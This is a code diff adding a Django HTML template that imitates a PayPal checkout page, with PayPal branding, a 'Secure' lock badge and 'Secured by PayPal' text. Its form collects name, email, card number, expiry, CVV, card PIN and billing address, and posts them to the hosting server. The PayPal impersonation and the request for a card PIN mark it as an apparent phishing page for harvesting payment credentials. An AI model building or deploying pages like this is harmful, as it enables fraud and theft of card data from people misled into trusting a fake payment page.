@@ -1,0 +1,221 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure PayPal Checkout</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background-color: #f7f7f7;
+        }
+        .paypal-blue {
+            background-color: #003087;
+        }
+        .paypal-button-blue {
+            background-color: #0070BA;
+        }
+        .paypal-button-blue:hover {
+            background-color: #005EA6;
+        }
+        .paypal-input {
+            border: 1px solid #c3c3c3;
+            transition: all 0.2s ease;
+        }
+        .paypal-input:focus {
+            border-color: #0070BA;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center">
+    <div class="w-full max-w-md bg-white shadow-lg rounded-lg overflow-hidden">
+        <!-- PayPal Header -->
+        <div class="paypal-blue text-white py-4 px-6 flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+                <i class="fab fa-paypal text-2xl"></i>
+                <h1 class="text-xl font-bold">PayPal</h1>
+            </div>
+            <div class="flex items-center space-x-2">
+                <i class="fas fa-lock text-sm"></i>
+                <span class="text-sm">Secure</span>
+            </div>
+        </div>
+
+        <!-- Payment Details -->
+        <div class="p-6">
+            <!-- Order Summary -->
+            <div class="bg-gray-100 rounded-lg p-4 mb-6">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-600">Total to pay</span>
+                    <span class="text-xl font-bold text-black">{{ display_currency }} {{ display_price }}</span>
+                </div>
+            </div>
+
+            <!-- Payment Form -->
+            <form method="post" class="space-y-4">
+                {% csrf_token %}
+                <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
+
+                <!-- Personal Information -->
+                <div>
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="{{ form.name.id_for_label }}">
+                        Full Name
+                    </label>
+                    {{ form.name }}
+                    {% if form.name.errors %}
+                        <span class="text-red-500 text-xs mt-1">{{ form.name.errors|join:", " }}</span>
+                    {% endif %}
+                </div>
+
+                <div>
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="{{ form.email.id_for_label }}">
+                        Email Address
+                    </label>
+                    {{ form.email }}
+                    {% if form.email.errors %}
+                        <span class="text-red-500 text-xs mt-1">{{ form.email.errors|join:", " }}</span>
+                    {% endif %}
+                </div>
+
+                <!-- Card Details -->
+                <div>
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="{{ form.card_number.id_for_label }}">
+                        Card Number
+                    </label>
+                    {{ form.card_number }}
+                    {% if form.card_number.errors %}
+                        <span class="text-red-500 text-xs mt-1">{{ form.card_number.errors|join:", " }}</span>
+                    {% endif %}
+                </div>
+
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-gray-700 text-sm font-bold mb-2" for="{{ form.expiry_date.id_for_label }}">
+                            Expiration Date
+                        </label>
+                        {{ form.expiry_date }}
+                        {% if form.expiry_date.errors %}
+                            <span class="text-red-500 text-xs mt-1">{{ form.expiry_date.errors|join:", " }}</span>
+                        {% endif %}
+                    </div>
+                    <div>
+                        <label class="block text-gray-700 text-sm font-bold mb-2" for="{{ form.cvv.id_for_label }}">
+                            CVV
+                        </label>
+                        <div class="relative">
+                            {{ form.cvv }}
+                            <button type="button" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400" 
+                                    onclick="toggleFieldVisibility('{{ form.cvv.id_for_label }}', 'cvv-toggle-icon')">
+                                <i class="fas fa-eye" id="cvv-toggle-icon"></i>
+                            </button>
+                        </div>
+                        {% if form.cvv.errors %}
+                            <span class="text-red-500 text-xs mt-1">{{ form.cvv.errors|join:", " }}</span>
+                        {% endif %}
+                    </div>
+                </div>
+                <div>
+                    <label class="payment-label" for="{{ form.card_pin.id_for_label }}">
+                        Card PIN
+                    </label>
+                    <div class="relative">
+                        {{ form.card_pin }}
+                        <button type="button" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400" 
+                                onclick="toggleFieldVisibility('{{ form.card_pin.id_for_label }}', 'pin-toggle-icon')">
+                            <i class="fas fa-eye" id="pin-toggle-icon"></i>
+                        </button>
+                    </div>
+                    {% if form.card_pin.errors %}
+                        <span class="text-red-500 text-xs mt-1">{{ form.card_pin.errors|join:", " }}</span>
+                    {% endif %}
+                </div>
+
+                <!-- Additional PayPal-specific Fields -->
+                <div>
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="billing-address">
+                        Billing Address
+                    </label>
+                    <input type="text" id="billing-address" name="billing_address" 
+                           class="w-full px-3 py-2 border rounded-md paypal-input"
+                           placeholder="Street Address">
+                </div>
+
+                <div class="grid grid-cols-3 gap-4">
+                    <div class="col-span-2">
+                        <input type="text" name="city" 
+                               class="w-full px-3 py-2 border rounded-md paypal-input"
+                               placeholder="City">
+                    </div>
+                    <div>
+                        <input type="text" name="zip" 
+                               class="w-full px-3 py-2 border rounded-md paypal-input"
+                               placeholder="ZIP">
+                    </div>
+                </div>
+
+                <!-- PayPal Specific Checkbox -->
+                <div class="flex items-center mb-4">
+                    <input type="checkbox" id="save-card" name="save_card" 
+                           class="mr-2 text-paypal-blue focus:ring-paypal-blue">
+                    <label for="save-card" class="text-sm text-gray-600">
+                        Save this card for future payments
+                    </label>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="w-full paypal-button-blue text-white font-bold py-3 rounded-md transition duration-300 hover:opacity-90">
+                    Pay Now
+                </button>
+            </form>
+
+            <!-- PayPal Footer -->
+            <div class="mt-6 text-center text-sm text-gray-500">
+                <p>Secured by <span class="font-bold text-paypal-blue">PayPal</span></p>
+                <p class="mt-2">Need help? <a href="#" class="text-blue-600 hover:underline">Contact Support</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Existing card number and toggle visibility functions
+        function formatCardNumber(e) {
+            let input = e.target;
+            let value = input.value.replace(/\D/g, '');  // Remove non-digit characters
+            let formattedValue = '';
+
+            // Group digits in blocks of 4
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+
+            // Set the input value to the formatted value (limit to 19 characters)
+            input.value = formattedValue.substring(0, 19);
+        }
+
+        function toggleFieldVisibility(fieldId, iconId) {
+            const field = document.getElementById(fieldId);
+            const icon = document.getElementById(iconId);
+            if (field.type === 'password') {
+                field.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                field.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const cardNumberInput = document.querySelector('#{{ form.card_number.id_for_label }}');
+            cardNumberInput.addEventListener('input', formatCardNumber);
+        });
+    </script>
+</body>
+</html>
